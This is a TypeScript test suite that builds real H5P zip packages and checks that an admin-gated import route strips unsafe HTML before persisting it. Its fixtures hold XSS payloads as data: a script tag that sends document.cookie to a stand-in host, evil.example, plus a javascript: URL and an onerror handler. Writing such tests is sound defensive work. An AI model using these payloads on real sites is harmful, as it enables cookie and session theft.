import { describe, it, before, after } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { ZipFile } from "yazl";

import { createApp } from "../src/app.js";
import { getRuntimeConfig } from "../src/config.js";

// SPEC-005 remediation (Finding 3 + Finding 4): builds REAL .h5p packages
// (actual zip archives processed by Lumi's own PackageValidator/
// PackageImporter, not a mocked sanitizer call) and verifies the import
// pipeline never lets unsafe content become the PERSISTED, readable state of
// a content object — the assertion the review specifically called for is not
// "the sanitizer function returns safe text" but "unsafe content did not
// enter trusted persistent runtime state".
describe("H5P package import security (Finding 3, Finding 4)", () => {
  let storageDir: string;
  let packagesDir: string;
  let app: Awaited<ReturnType<typeof createApp>>["app"];
  let contentManager: Awaited<ReturnType<typeof createApp>>["editor"]["contentManager"];

  const adminSecret = "an-admin-secret-that-is-at-least-32-characters-long!";

  before(async () => {
    storageDir = mkdtempSync(path.join(tmpdir(), "pfy-h5p-import-test-"));
    packagesDir = mkdtempSync(path.join(tmpdir(), "pfy-h5p-packages-"));
    const config = getRuntimeConfig({
      PORT: "0",
      PFY_H5P_RUNTIME_SECRET: "a-very-long-secret-that-is-at-least-32-characters!",
      PFY_H5P_ADMIN_SECRET: adminSecret,
      PFY_H5P_STORAGE_PATH: storageDir,
    });
    const created = await createApp(config);
    app = created.app;
    contentManager = created.editor.contentManager;
  });

  after(() => {
    rmSync(storageDir, { recursive: true, force: true });
    rmSync(packagesDir, { recursive: true, force: true });
  });

  /**
   * Builds a real .h5p (zip) package with an embedded minimal runnable
   * library plus content.json containing `contentParameters`. Returns the
   * absolute path to the built package file.
   */
  let nextLibraryMinorVersion = 0;

  async function buildPackage(
    name: string,
    contentParameters: unknown,
    options?: {
      extraEntry?: { path: string; content: string };
      semantics?: unknown;
    },
  ): Promise<string> {
    const zip = new ZipFile();

    // Each fixture package gets its OWN library minor version. h5p-server's
    // PackageValidator skips re-installing (and re-reading semantics.json
    // for) an already-installed library version — reusing one version across
    // fixtures with different `semantics` would silently keep the FIRST
    // fixture's semantics.json for every later import in this file.
    const minorVersion = nextLibraryMinorVersion++;
    const machineName = "H5P.ImportFixture";

    const h5pJson = {
      title: "Import security fixture",
      language: "en",
      mainLibrary: machineName,
      embedTypes: ["iframe"],
      license: "U",
      preloadedDependencies: [{ machineName, majorVersion: 1, minorVersion }],
    };
    const libraryJson = {
      title: "Import Fixture",
      machineName,
      majorVersion: 1,
      minorVersion,
      patchVersion: 0,
      runnable: 1,
      license: "MIT",
    };

    zip.addBuffer(Buffer.from(JSON.stringify(h5pJson)), "h5p.json");
    zip.addBuffer(Buffer.from(JSON.stringify(contentParameters)), "content/content.json");
    zip.addBuffer(
      Buffer.from(JSON.stringify(libraryJson)),
      `${machineName}-1.${minorVersion}/library.json`,
    );
    zip.addBuffer(
      Buffer.from(JSON.stringify(options?.semantics ?? [])),
      `${machineName}-1.${minorVersion}/semantics.json`,
    );

    if (options?.extraEntry) {
      zip.addBuffer(Buffer.from(options.extraEntry.content), options.extraEntry.path);
    }

    zip.end();

    const outPath = path.join(packagesDir, `${name}.h5p`);
    await new Promise<void>((resolve, reject) => {
      const chunks: Buffer[] = [];
      zip.outputStream.on("data", (chunk: Buffer) => chunks.push(chunk));
      zip.outputStream.on("end", () => {
        writeFileSync(outPath, Buffer.concat(chunks));
        resolve();
      });
      zip.outputStream.on("error", reject);
    });
    return outPath;
  }

  async function importPackage(packagePath: string) {
    // Exercise the actual HTTP route (not the internal function directly) so
    // this test also proves the admin-secret gate is on the exact code path
    // that performs persistence.
    const server = app.listen(0);
    await new Promise<void>((resolve) => server.once("listening", resolve));
    const port = (server.address() as { port: number }).port;
    try {
      const res = await fetch(`http://127.0.0.1:${port}/h5p/admin/import`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-PFY-H5P-Admin-Secret": adminSecret,
        },
        body: JSON.stringify({ packagePath }),
      });
      const body = await res.json();
      return { status: res.status, body };
    } finally {
      await new Promise((resolve) => server.close(resolve));
    }
  }

  it("imports benign content and persists it verbatim", async () => {
    const packagePath = await buildPackage("benign", { text: "<p>Hello safe world</p>" });
    const { status, body } = await importPackage(packagePath);
    assert.equal(status, 200);
    assert.equal(body.sanitized, false);

    const persisted = await contentManager.getContentParameters(body.contentId, undefined as never);
    assert.equal(persisted.text, "<p>Hello safe world</p>");
  });

  it("strips <script> tags before the content is ever persisted", async () => {
    const packagePath = await buildPackage("script-injection", {
      text: "<p>Safe</p><script>fetch('https://evil.example/steal?c='+document.cookie)</script>",
    });
    const { status, body } = await importPackage(packagePath);
    assert.equal(status, 200);
    assert.equal(body.sanitized, true);

    // The critical assertion: read back the PERSISTED state directly from
    // content storage (not the sanitizer's return value) and prove the
    // dangerous markup never became durable.
    const persisted = await contentManager.getContentParameters(body.contentId, undefined as never);
    assert.equal(JSON.stringify(persisted).includes("<script>"), false);
    assert.equal(JSON.stringify(persisted).includes("evil.example"), false);
    assert.equal(persisted.text, "<p>Safe</p>");
  });

  it("strips javascript: URLs before the content is ever persisted", async () => {
    const packagePath = await buildPackage("js-url", {
      text: '<a href="javascript:alert(document.cookie)">click me</a>',
    });
    const { status, body } = await importPackage(packagePath);
    assert.equal(status, 200);
    assert.equal(body.sanitized, true);

    const persisted = await contentManager.getContentParameters(body.contentId, undefined as never);
    assert.equal(JSON.stringify(persisted).includes("javascript:"), false);
  });

  it("strips inline event handlers (onerror) nested inside arrays before persistence", async () => {
    const packagePath = await buildPackage("nested-onerror", {
      items: [{ text: '<img src="x" onerror="alert(document.cookie)">' }, { text: "plain" }],
    });
    const { status, body } = await importPackage(packagePath);
    assert.equal(status, 200);
    assert.equal(body.sanitized, true);

    const persisted = await contentManager.getContentParameters(body.contentId, undefined as never);
    assert.equal(JSON.stringify(persisted).includes("onerror"), false);
    assert.equal(persisted.items[1].text, "plain");
  });

  it("also runs Lumi's OWN trusted editor-save SemanticsEnforcer, not just our independent sanitizer (Finding 4)", async () => {
    // A semantic "text" field with an empty tags allowlist means Lumi's
    // SemanticsEnforcer.enforceTextSemantics will strip ALL HTML (it only
    // ever allows div/span/p/br unconditionally, per its own hardcoded
    // baseline) before content is saved. This is Lumi's own trusted
    // editor-save sanitization path, verified running on IMPORTED content —
    // which conditions 1-4 in ADR-001 require and which the previous
    // implementation's route bypassed entirely by calling
    // contentManager.createOrUpdateContent directly instead of going through
    // editor.saveOrUpdateContentReturnMetaData.
    const semantics = [{ name: "text", type: "text", tags: [] }];
    const packagePath = await buildPackage(
      "semantics-enforced",
      { text: "<strong>bold</strong><script>alert(1)</script>" },
      { semantics },
    );
    const { status, body } = await importPackage(packagePath);
    assert.equal(status, 200);

    const persisted = await contentManager.getContentParameters(body.contentId, undefined as never);
    // <strong> is not in the empty tags allowlist and not one of
    // SemanticsEnforcer's unconditional div/span/p/br, so Lumi's OWN
    // sanitizer (not ours) must have removed it.
    assert.equal(JSON.stringify(persisted).includes("<strong>"), false);
    assert.equal(JSON.stringify(persisted).includes("<script>"), false);
  });

  it("rejects a package with an unsupported/disallowed file extension", async () => {
    const packagePath = await buildPackage(
      "disallowed-extension",
      { text: "safe" },
      { extraEntry: { path: "content/payload.exe", content: "MZ-fake-binary" } },
    );
    const { status } = await importPackage(packagePath);
    assert.equal(status, 400);
  });

  it("fails closed on a non-existent package path instead of throwing", async () => {
    const { status } = await importPackage("/tmp/this-file-does-not-exist-at-all.h5p");
    assert.equal(status, 400);
  });

  it("fails closed on a corrupt/non-zip package instead of throwing", async () => {
    const corruptPath = path.join(packagesDir, "corrupt.h5p");
    writeFileSync(corruptPath, Buffer.from("not a zip file at all"));
    const { status } = await importPackage(corruptPath);
    assert.equal(status, 400);
  });
});
